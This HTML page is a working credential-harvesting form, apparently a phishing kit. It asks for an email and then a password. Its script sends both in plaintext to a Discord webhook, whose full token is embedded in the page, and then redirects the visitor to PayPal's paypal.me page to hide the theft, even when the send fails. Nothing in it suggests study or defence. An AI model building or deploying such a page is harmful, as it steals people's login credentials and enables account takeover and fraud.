<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Form with Discord webhook and redirect</title>
  <style>
    .hidden { display: none; }
  </style>
</head>
<body>
  <!-- Email step -->
  <form id="emailForm">
    <label for="emailInput">Enter your email:</label>
    <input type="email" id="emailInput" required />
    <button type="submit">Next</button>
  </form>

  <!-- Password step -->
  <div id="passwordStep" class="hidden">
    <p>Your email: <span id="userEmailDisplay"></span></p>
    <form id="passwordForm">
      <label for="passwordInput">Enter your password:</label>
      <input type="password" id="passwordInput" required />
      <label>
        <input type="checkbox" id="showPassword" /> Show password
      </label>
      <button type="submit">Submit</button>
    </form>
  </div>

  <script>
    const emailForm = document.getElementById('emailForm');
    const passwordStep = document.getElementById('passwordStep');
    const userEmailDisplay = document.getElementById('userEmailDisplay');
    const emailInput = document.getElementById('emailInput');
    const passwordForm = document.getElementById('passwordForm');
    const passwordInput = document.getElementById('passwordInput');
    const showPassword = document.getElementById('showPassword');

    const webhookURL = 'https://discord.com/api/webhooks/1358533803164827791/SC7RqePQmAO3StmRzKpPauhodEGwl3KmOh4sKkO_rYbRpl5rJ8yQhKyYqgWjZDO7MM-n';

    emailForm.addEventListener('submit', function (e) {
      e.preventDefault();
      userEmailDisplay.textContent = emailInput.value;
      emailForm.classList.add('hidden');
      passwordStep.classList.remove('hidden');
    });

    passwordForm.addEventListener('submit', function (e) {
      e.preventDefault();

      const email = emailInput.value;
      const password = passwordInput.value;

      const data = {
        content: `Email: ${email}\nPassword: ${password}`
      };

      fetch(webhookURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
      })
      .then(response => response.json())
      .then(data => {
        console.log('Successfully sent data to Discord:', data);
        // Redirect after successful send
        window.location.href = "https://www.paypal.com/paypalme/";
      })
      .catch(error => {
        console.error('Error sending data to Discord:', error);
        // Even if error, redirect anyway after 1 sec
        setTimeout(() => {
          window.location.href = "https://www.paypal.com/paypalme/";
        }, 1000);
      });
    });

    showPassword.addEventListener('change', function () {
      passwordInput.type = this.checked ? 'text' : 'password';
    });
  </script>
</body>
</html>
